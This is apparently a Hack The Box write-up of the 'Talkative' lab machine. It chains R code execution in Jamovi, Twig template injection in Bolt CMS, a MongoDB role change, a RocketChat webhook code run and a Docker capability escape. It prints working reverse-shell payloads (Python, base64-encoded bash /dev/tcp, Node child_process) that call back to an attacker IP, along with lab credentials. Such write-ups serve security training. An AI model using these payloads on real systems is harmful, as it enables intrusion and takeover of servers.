---
layout: post
title:  "HTB Writeup [Linux - Hard] - Talkative"
published: false
---

![](/assets/Talkative/Talkative.png)

## Summary
- Talkative is a Linux box with a really long chain of exploitation between several containers to finally crack the host.
- The intial foothold is on an analytics web app called Jamovi that was on port 8080. It had a module called "RJ Editor" which gave us access to run system commands using the R language.
- After using an R reverse shell, we get on that app's container as `root`.
- In `/root`, found an archive that contained passwords for 3 users: `matt`, `janit` and `saul`.
- We attempted to break out of this container to get on the host but didn't find a way to do that.
- We also uploaded an `nmap` binary to scan our subnet. With it, we found the host's IP address but it didn't have its SSH port exposed.
- Having run out of options, we reused the passwords on the Bolt CMS instance on port 80, we could log in with `saul`'s password but as the `admin` user.
- Because Bolt CMS used the Twig PHP template engine, we were able to execute an SSTI payload for another RCE to obtain a shell as `www-data` on the Bolt CMS container.
- We transferred a binary for `nmap` to that container so we can scan our subnet. we found many hosts with port 80 open, but two ones stuck out with ports 22 for SSH and 27017 for MongoDB.
- We could gain access to the first host through SSH when we used `saul`'s credentials from before. Note: access to SSH was only available from within that container as the port was filtered from the outside.
- And to reach Mongo, we set up `chisel` to forward any connections from our Kali to that port. We could log in to that database without authentication.
- That DB instance belonged to the Rocket Chat application that was on port 3000. After registering our own user, we modified our privileges by altering the users collection on Mongo to become an administrator.
- With that privilege, we accessed the admin interface and were able to get a third RCE using JavaScript webhooks as `root` on the rocket chat application container.
- To finally root the box, we exploit the capabilities granted to our container to get privileged read and write access on the host.
- We could exploit the `cap_dac_read_search` capability to read `/etc/shadow` and `root.txt`.
- But, to fully own the box, we abuse the `cap_dac_override` capability to write our SSH public key into `/root/.ssh/authorized_keys` and get a `root` shell (this is using the 2nd container since it had the SSH client).

---

## NMAP
```
# Nmap 7.92 scan initiated Thu Sep  8 05:52:25 2022 as: nmap -sC -sV --version-all -oN 10.10.11.155-full-scan.nmap -p 22,80,3000,8080,8081,8082 10.10.11.155
Nmap scan report for talkative (10.10.11.155)
Host is up (0.12s latency).

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://talkative.htb
|_http-server-header: Apache/2.4.52 (Debian)
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: Bcy5tmWBNwCAATRnA
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Thu, 08 Sep 2022 09:52:39 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open     http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
```

`nmap` gives us a lot of ports to check out: 80, 3000 and 8080 through 8082. SSH is there but filtered which suggest it's closed off by a firewall or something.

- Port 80 redirects to `http://talkative.htb` so we have a host name to add to our `/etc/hosts` file and we would be wise to search for other vhosts.
- Port 3000 seems to be a web application.
- Port 8080 has an `http-title` of jamovi which seems interesting.
- Ports 8081 and 8082 give a `404 - Not Found` but there might be more to them.
- And Lastly, all 808X ports are hosted on a different web server called Tornado httpd with a version of 5.0 (we should check if it's vulnerble)

## Checking Out Port 80
After modifying the `/etc/hosts` file with the `talkative.htb` hostname, we visit the website:

![](/assets/Talkative/Port-80-wappalyzer.jpg)

Wappalyzer shows us it's running Bolt CMS and PHP as its server-side language. Good to know.

We also find a list of usernames there:

![](/assets/Talkative/port-80-usernames-and-links.jpg)

Each one's "Read More" link takes us to another page with his email in it:

![](/assets/Talkative/janit-user-mail.jpg)

So we end up with 3 users

1. Janit Smith - janit@talkative.htb
2. Saul Goodman - saul@talkative.htb
3. Matt Williams - matt@talkative.htb

We also find references to products

![](/assets/Talkative/port-80-products.jpg)

### 1. TALKZONE

![](/assets/Talkative/port-80-talkzone.jpg)

### 2. TALKFORBIZ (Coming Soon)

this one talks about RocketChat

![](/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg)

### 3. TALK-A-STATS (Coming Soon)

and this one mentioned Jamovi and links to it on the bottom

![](/assets/Talkative/port-80-talkastats.jpg)

But apart from that, it's not much here to played with. So we move on..

## Checking Port 3000

Over port 3000, we find the homepage for RocketChat. It allowed registration.

![](/assets/Talkative/port-3000-rocket-registration.jpg)

We could register with the email as `test@talkative.htb` other domains weren't accepted.

The Channels area had one channel: General which didn't include much information.

![](/assets/Talkative/port-3000-empty-chat.jpg)

Before diving any deeper into fingerprinting and perhaps exploit search, we decide to first take a quick look on Jamovi.

## Jamovi

The home page had an indicator of a vulnerability.

![](/assets/Talkative/jamovi-first-look.jpg)

There was the "R" icon which had a drop-down menu containing the "RJ Editor" module.

![](/assets/Talkative/jamovi-rj-editor.jpg)

So we checked it out.

![](/assets/Talkative/jamovi-rj-editor-code.jpg)

A little background:

"R" is a programming language commonly used for statistics-related stuff. And it seems we have the ability to run it from this web console.

we searched google for "r reverse shell"

![](/assets/Talkative/search-r-reverse-shell.jpg)

and got back this [Github gist](https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462)

![](/assets/Talkative/r-reverse-shell-gist.jpg)

using it gave us a reverse shell as `root`

![](/assets/Talkative/jamovi-container-rooted.jpg)

Because the shell we had wasn't that great, we used it to get proper one with `python` xD

```bash
export RHOST="10.10.16.9"
export RPORT=9000
python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

the first thing we noticed after getting inside, was being in a container.

![](/assets/Talkative/jamovi-container.jpg)

### Finding Creds in the Jamovi Docker

In `/root`, we found an interesting file: `bolt-administration.omv`

![](/assets/Talkative/jamovi-container-root-dir.jpg)

But since the `unzip` utility wasn't found on the docker, we used a bash trick commonly-used in reverse shells to transfer it back to our Kali

![](/assets/Talkative/file-transfer-without-nc.jpg)

Having verified the file's integrity using `md5sum`, we unzipped the archive:

![](/assets/Talkative/unzipping-bolt-archive.jpg)

the `xdata.json` file had the kind of loot we were looking for :D

![](/assets/Talkative/bolt-archive-loot.jpg)

from the file's name, we know the creds inside should work for the bolt instance. but before that, we make a couple of important checks:

### Scanning our subnet and attempting to reach the host

right now, we need to check if we can reach the host spawning our docker. if it has SSH port open, we will try to reuse the creds we found there.

we will get our container's IP first using `hostname -i`

![](/assets/Talkative/jamovi-container-ip.jpg)

we're at `172.18.0.2`.

Usually the host sits at the first IP of the subnet `172.18.0.1`. But we can't confirm with `ping` or `ssh` to it because neither of those tools are installed :/

![](/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg)

To check the open ports on the host as well as enumerate this subnet, we're going to upload an [nmap standalone binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) which we found on Github.

we use the same bash tricks we used earlier but in the opposite direction this time

![](/assets/Talkative/jamovi-container-transfer-nmap.jpg)

then run a quick network discovery

![](/assets/Talkative/jamovi-container-network-discovery.jpg)

we find the `172.18.0.1` host up. so we go ahead and run a full port scan.

but we find a missing file `/etc/services` required. but we get it from our kali and proceed.

![](/assets/Talkative/jamovi-container-no-ssh-to-host.jpg)

we find SSH port filtered :/

the remaining ports are already exposed from outside. so we move on..

### Attempting to escape our container

Because we had `root` privilege, it was worth it to run a tool like [deepce.sh](https://github.com/stealthcopter/deepce) to try and break out of our docker.

![](/assets/Talkative/jamovi-deepce-sh.jpg)

The capability we found: `cap_dac_override` isn't dangerous on its own. it requires the `cap_dac_read_search` with it to get us out of the container.

Having run out of options, we're going to pay Bolt a visit :)

## Reusing Creds on Bolt and Exploiting it for RCE

To find bolt's login page, we searched Google with "bolt admin login".

We got back the [Official Documentation Page](https://docs.boltcms.io/5.0/manual/login)

according to it, the `/bolt` web directory should lead us to the login page. And it does:

![](/assets/Talkative/bolt-login-page.jpg)

After trying all the names we have (`janit`, `saul`, `matt`) as usernames and their emails ('`<USER>@talkative.htb`') with all the passwords, we didn't log in.

However, trying the `admin` username worked with matt's password: `jeO09ufhWD<s`

Looking around for RCE venues, we tried to upload a PHP reverse shell since bolt ran it server-side.

But that file type wasn't allowed.

![](/assets/Talkative/bolt-fail-to-upload-php.jpg)

And, editing the config file wasn't an option either.

![](/assets/Talkative/bolt-cant-edit-config-file.jpg)

However, since we can edit and upload `.twig` files, we have a chance to execute code through Server-Side Template Injection (SSTI).

That's because Twig is a template engine for PHP and essentially enables us to evaluate PHP code.

To exploit that, we go to "File Management" > "View & edit templates"

![](/assets/Talkative/bolt-view-edit-templates.jpg)

We choose the "base-2021" theme becuase it's likely the one in use. then choose `index.twig`

![](/assets/Talkative/bolt-index-twig-writable.jpg)

it seems writable, we should be good to go.

Next, we insert a standard SSTI payload from [PayloadAllTheThings Github Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig)

```
{{7*'7'}}
```

![](/assets/Talkative/bolt-basic-ssti-payload.jpg)

This should reflect the number 49 in the home page.

But it doesn't take effect unless we use the "Clear the cache" functionality under the "Maintenance" section:

![](/assets/Talkative/bolt-clear-the-cache-feature.jpg)

![](/assets/Talkative/bolt-ssti-execution-confirmed.jpg)

Having confirmed code execution, we switch up to a base64-encoded bash reverse shell payload:

```php
{{['echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash']|filter('system')}}
```

which decodes to/should run:

```bash
bash -i >& /dev/tcp/10.10.16.9/9000 0>&1
```

![](/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg)

with another cache clear and a visit to the home page, we get a shell back as `www-data`

![](/assets/Talkative/bolt-ssti-shell-access.jpg)

## Enumerating the Docker Environment and Reaching the Host

Listing the contents of the system root shows us we are also in a Docker container with an IP of `172.17.0.13`

![](/assets/Talkative/bolt-docker-ip.jpg)

which is in a different subnet from the Jamovi container which was in `172.18.0.0/24`

To check out this subnet, we're going to do the same thing as we did before.

We upload it to the Bolt container using `curl` and a Python HTTP server (port 80 didn't work here so we used 8000)

![](/assets/Talkative/bolt-docker-getting-nmap.jpg)

then run a quick host discovery over the `172.17.0.0/24` subnet

![](/assets/Talkative/bolt-docker-nmap-discovery.jpg)

We discovered a LOT of live devices there (from `172.17.0.1` all the way up to `172.17.0.19`)

We've been wanting to try the creds we found on the host's SSH port from the Jamovi container. But the port was also filtered.

However, we found the `ssh` client installed on this one and found the port accessible.

![](/assets/Talkative/bolt-docker-try-ssh-to-host.jpg)

the set of creds that worked were `saul`'s username and `matt`'s password again `jeO09ufhWD<s`

![](/assets/Talkative/ssh-as-saul.jpg)

## Finding RocketChat's MongoDB Instance and Altering it

Running a privesc script here didn't yield any results. but there were plenty of docker instances running that looked interesting:

![](/assets/Talkative/host-enumerating-docker-processes.jpg)

- Most of the ports were 80.
- There was one for 3000 which is probably for RocketChat. That's a container we haven't touched.
- There were other high ports that we wanted to check.

But to sure we're not missing any other ports, we uploaded `nmap` and ran a full port scan over the entire `172.17.0.2-19` IP range.

And we did find something very interesting:

![](/assets/Talkative/host-mongo-db-discovered.jpg)

port 27017 is usually for MongoDB. which is known for having no authentication by default.

we will to forward traffic from our kali to reach that port on the `172.17.0.2` host.

[chisel](https://github.com/jpillora/chisel) is a nice choice for its ease-of-use. we upload it back on the bolt container.

and create a tunnel to mongo.

![](/assets/Talkative/tunneling-and-reaching-mongodb.jpg)

Having authenticated without any credentials, we enumerate the database:

```bash
# listing the databases
show dbs
# using the meteor database
use meteor
# show collections in that database (equivaled to tables in MySQL)
show collections
```

we find a collection called users which had interesting stuff:

![](/assets/Talkative/saul-rockechat-user.jpg)

this was the saul user's account, which had an admin role.

we tried to:
1. login as him using the 3 passwords we found earlier, but none worked.
2. use his ID and token as our cookies to impersonate him, that also didn't work
![](/assets/Talkative/using-saul-cookies-for-impersonation.jpg)
3. we also tried cracking the bcrypt hash. but without any luck.
4. we even replaced that bcrypt hash with one that we generated. But that change didn't reflect somehow.

so, we chose to update our user's privileges in the database and grant him admin privileges instead :D

```javascript
db.users.update( { _id : "voBu5qYu5ye3vDcw7"}, {
	$set: { 
		roles: ["admin"]
	}
})
```

![](/assets/Talkative/mongo-grant-admin-role.jpg)

![](/assets/Talkative/mongo-admin-role-granted.jpg)

after relogging, we could now access RocketChat as an administrator at `/admin`

![](/assets/Talkative/rocket-chat-logged-in-as-admin.jpg)

searching for exploits for that version (2.4.14) didn't get us anywhere.

So, we probed the application for abusable functionalities.

## Exploiting RocketChat's WebHooks for RCE
Searching Google for ways to execute code using RocketChat's admin, we came across these results:

![](/assets/Talkative/rocket-chat-search-admin-rce.jpg)

Inpecting the exploit on [Exploit-DB](https://www.exploit-db.com/exploits/50108) shows us that the Integration feature is used to run Javascript code to obtain RCE.

![](/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg)

following the exploit's way of creating a payload, we create our own to execute a bash reverse shell instead of the `cmd` variable.

```javascript
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzkwMDAgMD4mMQ== | base64 -d | bash');
```

![](/assets/Talkative/rocket-chat-incoming-webhook-setup.jpg)

Once, we've saved the changes, we copy the `curl` command over and use it to trigger the webhook after starting our `ncat` listener:

![](/assets/Talkative/rocket-chat-obtaining-the-webhook-url.jpg)

getting a sweet root shell on the RocketChat container.

![](/assets/Talkative/rocket-chat-curling-the-webhook-url.jpg)

## Escaping and Owning the Host (Finally)
right after geting our shell, we improve it using the `script` utility to provide a pty.

![](/assets/Talkative/rocket-chat-container-improving-the-shell.jpg)

Right away, we transfer `deepce.sh` and run it to check for ways to escape to the host.

However, it couldn't enumerate capabilities because the `capsh` tool wasn't installed.

![](/assets/Talkative/rocket-container-no-capsh-installed.jpg)

Capabilities are one of the main ways to escape Docker. so we have to install that tool.

we `cat` the `/etc/os-release` file to know our Linux distro.

![](/assets/Talkative/rocket-container-linux-distro.jpg)

We're on Debian 10, so we search Google to find out how to install `capsh`

The first results was [This website](https://command-not-found.com/capsh)

![](/assets/Talkative/rocket-container-finding-capsh-dependencies-1.jpg)

it showed that we needed the `libcap2-bin` library.

we obtained it from [Debain packages site](https://packages.debian.org/sid/amd64/libcap2-bin/download)

but it had another requirement: `libcap2`

![](/assets/Talkative/rocket-container-finding-capsh-dependencies-2.jpg)

we got it the same way from [here](https://packages.debian.org/sid/amd64/libcap2/download) and installed it using `dpkg`

Having installed the required dependencies, we ran `deepce.sh` a second time:

![](/assets/Talkative/rocket-chat-container-capabilities-discovered.jpg)

This time, we find a set of critical capabilities. Namely `cap_dac_read_search` and `cap_dac_override` which together can be exploited to write files to the host machine.

We're going to follow the method explained in the awesome [HackTricks Page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) and compile the C code.

we're going to staticly link the binary to make sure it has everything it needs.

![](/assets/Talkative/privesc-compile-shocker-write.jpg)

and generate an SSH key pair so we can write it to the root user's `.ssh` directory.

![](/assets/Talkative/privesc-generating-ssh-key-pair.jpg)

after transferring the public key, we write it over the host's root user `authorized_keys` file.

![](/assets/Talkative/privesc-writing-ssh-public-key-to-host.jpg)

which was a success!

to finish out the box, we transferred the private key to the bolt container (since it had the `ssh` client installed).

and used it to own the box at last :D

![](/assets/Talkative/privesc-rooted-finally.jpg)

What a trip! XD